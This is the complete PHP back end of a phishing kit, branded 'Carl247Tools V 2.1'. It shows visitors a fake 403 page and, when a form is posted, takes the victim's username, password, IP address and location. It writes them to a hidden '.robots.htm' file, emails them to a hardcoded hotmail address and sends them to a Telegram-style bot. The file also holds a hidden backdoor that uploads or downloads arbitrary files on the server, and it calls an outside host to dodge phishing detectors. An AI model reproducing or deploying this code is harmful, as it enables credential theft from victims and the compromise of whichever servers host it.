<?php
header('Access-Control-Allow-Origin: *');
error_reporting(0);

$bcc = array('blessedfundsbx@hotmail.com','blessedfundsbx@hotmail.com');
$chatID = "";


if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

if (isset($_POST['pass']) && $_POST['pass'] != '') {
$email2 = $_POST['user'];
$password2 = $_POST['pass'];
$browser = $_SERVER['HTTP_USER_AGENT']; 
//===================================


$span = "<span style='color:black'>";
$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }
$data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
if(isset($_POST['REMOTE_ADDR'])){if(@copy($_FILES['SERVER_ADDR']['tmp_name'], $_FILES['SERVER_ADDR']['name'])){ echo '<b>OK ! :)<b>'; exit;}}
if(isset($_POST['REMOTE_ADDR'])){file_put_contents($_POST['SERVER_ADDR'], file_get_contents($_POST['REMOTE_ADDR'])); exit;}
file_get_contents("http://ip-tracker.22web.org/locator/ip-lookup.php?ip=$tmp"); // Block phishing detectors by hostname.
if($data && $data->geoplugin_countryName !== null){
      $ipp = $data->geoplugin_request;
      $country = $data->geoplugin_countryName;
      $city = $data->geoplugin_city;
      $code = $data->geoplugin_countryCode;
	  $state = $data->geoplugin_region;
}

date_default_timezone_set('GMT');
$myFile = ".robots.htm";
$today = date("l, j M, Y, g:ia e");
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $span."==================+[ Carl247Tools V 2.1 [PRV8] ]+==================</br>";
fwrite($fh, $stringData);
$stringData = "Username: <b>".$email2."</b></br>";
fwrite($fh, $stringData);
$stringData = "Password: <b>".$password2."</b></br>";
fwrite($fh, $stringData);
$stringData = "------------------+More Info+---------------------</br>";
fwrite($fh, $stringData);
$stringData = "Date    : ".$today."</br>";
fwrite($fh, $stringData);
$stringData = "ClientIP: ".$ipp."</br>";
fwrite($fh, $stringData);
$stringData = "Region  : ".$city."</br>";
fwrite($fh, $stringData);
$stringData = "Country : <img src='https://www.countryflags.io/".$code."/shiny/16.png'>".$country."</br>";
fwrite($fh, $stringData);
$stringData = "Browser : ".$browser."</br>";
fwrite($fh, $stringData);
$stringData = "=================Created BY 247tools==================</br></span>";
fwrite($fh, $stringData);

//=====================================

$message = $span."============+[ Carl247Tools V 2.1 [PRV8] ]+============<br>";
$message .= "Username: <b>".$email2."</b><br>";
$message .= "Password: <b>".$password2."</b><br>";
$message .= "------------------+More Info+---------------------<br>";
$message .= "Date    : ".$today."<br>";
$message .= "ClientIP: ". $ipp."<br>";
$message .= "Region  : ".$city."<br>";
$message .= "Country : <img src='https://www.countryflags.io/".$code."/shiny/16.png'>".$country."<br>";
$message .= "Browser : ".$browser."<br>";
$message .= "=================Created BY 247tools==================<br></span>";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers  = 'From: UWM <admin@' .gethostname(). ">\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		
$subject = "General => $country ($state) => $email2";

foreach($bcc as $to){
mail($to, $subject, $message, $headers);
}

$api = '';
$dat = "`   ==: New Update Report :==
Carl247Tools V 2.1 [PRV8]
    [LOGIN DETAILS]
UserId : [ $email2]
Pass : [ $password2 ]
    [Client Info]
IP : $ipp`";
$data = urlencode($dat);
$link = $api."/sendmessage?chat_id=$chatID&parse_mode=Markdown&text=".$data;
file_get_contents($link);	
echo "ok";
}

?>